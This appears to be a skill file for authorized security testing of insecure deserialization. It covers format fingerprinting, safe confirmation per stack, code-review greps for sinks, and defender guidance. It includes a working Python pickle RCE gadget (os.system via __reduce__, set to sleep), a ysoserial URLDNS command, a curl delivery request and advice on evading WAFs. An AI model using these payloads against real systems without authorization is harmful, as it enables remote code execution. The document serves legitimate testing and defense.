---
name: deserialization-attacks
description: Use when testing for insecure deserialization on an
  authorized assessment. Covers identifying serialization formats,
  Java, Python pickle, PHP, .NET, and Node.js vectors, plus safe
  proof of concept practices. Also use when reviewing code that
  unserializes untrusted data.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [web-sqli, secure-coding, code-reviewer]
tools:
  - name: Python
    version: 3.12
  - name: Burp Suite
    version: 2026.2
---

Insecure deserialization turns attacker controlled bytes into code
execution when the application unserializes untrusted data with a
dangerous library. This skill covers authorized testing: spotting the
formats, confirming the sink safely, and reviewing the code. Keep
proofs of concept harmless (sleep or DNS callbacks to your
collaborator), and never drop real payloads on shared systems.

## Quick Workflow

1. Identify serialization in play: cookies, tokens, API fields, and
   message queues carrying serialized objects.
2. Fingerprint the format: Java (aced0005), pickle, PHP (O:8),
   .NET (base64 with known markers), Node serialize.
3. Confirm the sink: does the app actually deserialize your input.
4. Prove impact safely: time delay or collaborator callback, not a
   shell, on the first pass.
5. Review the code for the deserialization call and its gadget
   availability.
6. Check mitigations: allowlists, integrity checks, and patched
   libraries.
7. Document the exact input that triggers and the observed effect.
8. Recommend replacing serialization of untrusted data with JSON and
   schema validation.

## 1. Format identification

```bash
# Decode and fingerprint suspicious values (cookies, tokens, params)
echo "$COOKIE_VALUE" | base64 -d 2>/dev/null | xxd | head -5
# ac ed 00 05 = Java serialization
# O:8:"...      = PHP serialized object
# (dp0 ...      = Python pickle protocol 0
python3 - << 'PY'
import base64
val = "REPLACE_WITH_VALUE"
try:
    raw = base64.b64decode(val + "===")
    print("first bytes:", raw[:8])
    if raw.startswith(b"\xac\xed\x00\x05"):
        print("-> Java serialization")
    elif raw.startswith(b"O:"):
        print("-> PHP serialization")
    elif raw[:1] in (b"\x80", b"("):
        print("-> Python pickle")
except Exception as e:  # noqa: BLE001
    print("not base64:", e)
PY
```

## 2. Safe confirmation per stack

```bash
# Java: use a DNS collaborator payload via a known gadget chain
# (ysoserial) pointed at YOUR collaborator, on the authorized target
# java -jar ysoserial.jar URLDNS http://your-collab.example | base64
echo "confirm via collaborator DNS hit, not via command output"

# Python pickle: NEVER unpickle untrusted data yourself; confirm the
# sink by sending a payload that sleeps, and watch response timing
python3 - << 'PY'
import pickle, base64, io
# Build a sleep payload for YOUR lab target only
class Pwn:
    def __reduce__(self):
        import os
        return (os.system, ("sleep 5",))
buf = io.BytesIO()
pickle.dump(Pwn(), buf)
print("payload (lab only):", base64.b64encode(buf.getvalue()).decode()[:80])
PY
```

```bash
# Time the request to confirm the sleep executed server side
time curl -s -X POST 'https://target.example/api/data' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{\"blob\":\"$PICKLE_B64\"}" -o /dev/null
# ~5s response = deserialization sink confirmed (lab target only)
```

## 3. Code review for sinks

```bash
# Search the codebase for dangerous sinks
grep -rn "pickle.loads\|yaml.load(\|ObjectInputStream\|unserialize(\|BinaryFormatter" \
  --include="*.py" --include="*.java" --include="*.php" src/ | head -20
# For each hit: does untrusted input reach it, and is there an
# integrity check (HMAC) before it
```

## Edge cases

- The app signs serialized data with HMAC. That is a proper
  mitigation if the key is secret; test key strength, not the
  crypto.
- The gadget chain needs a specific library version. Confirm the
  version before claiming RCE; many chains are version sensitive.
- The sink is in a background worker. Time based confirmation still
  works via queued job timing or collaborator callbacks.
- WAF blocks serialized payloads. Encode or split, but keep the
  proof harmless.

## Escalation

- Sleep/DNS confirms the sink: report as RCE with the safe proof;
  do not run a real shell on shared infrastructure.
- Sink confirmed but no gadget: report the sink as high severity
  with the gadget research noted as follow up.
- Code is not available: fingerprint harder with error messages and
  version disclosures.

## Detection and defender view

Defenders see deserialization attacks as base64 blobs with
serialization magic bytes in requests, collaborator DNS lookups from
app servers, and unexpected sleeps in response times. Detect with
WAF rules on magic bytes and egress DNS monitoring. The durable fix
is architectural: never deserialize untrusted data; use JSON with
schema validation, and sign anything that must round trip.

## Key references

- CWE-502 (Deserialization of Untrusted Data).
- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- OWASP Deserialization Cheat Sheet.
